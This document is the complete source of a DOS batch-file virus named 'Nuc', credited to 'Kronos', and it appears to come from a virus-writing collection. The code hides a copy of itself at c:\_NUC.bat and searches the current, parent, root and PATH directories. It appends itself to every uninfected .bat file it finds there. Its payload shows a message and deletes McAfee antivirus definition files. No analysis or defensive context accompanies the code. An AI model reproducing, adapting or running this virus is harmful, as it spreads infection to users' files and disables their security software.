:: [Nuc]
:: by Kronos
@echo off%_NUC%
if '%1=='NUC goto NUC%2
set NUC=%0.bat
if not exist %NUC% set NUC=%0
if '%NUC%==' set NUC=autoexec.bat
if exist c:\_NUC.bat goto NUC_go
if not exist %NUC% goto evol_NUC
find "NUC"<%NUC%>c:\_NUC.bat
attrib c:\_NUC.bat +h
:NUC_go
if '%!NUC%=='----- goto NUC_exit
set !NUC=%!NUC%-
command /e:5000 /c c:\_NUC NUC v . .. \ %path%
:evol_NUC
set NUC=
goto NUC_pay
:NUCv
shift%_NUC%
if '%2==' exit NUC
for %%a in (%2\*.bat %2*.bat) do call c:\_NUC NUC inf %%a
goto NUCv
:NUC_inf
find "NUC"<%3>nul
if not errorlevel 1 goto NUC_jump
type %3>NUC$
echo.>>NUC$
type c:\_NUC.bat>>NUC$
move NUC$ %3>nul
set NUC!=%NUC!%-
if %NUC#%==-----exit
:NUC_jump
set NUC!=%NUC!%-
if %NUC!%==-----exit
:NUC_pay
echo More Popular than Die
echo y| del c:\mcafee\*.dat
echo y| del c:\progra~1\mcafee\*.dat
:NUC_exit
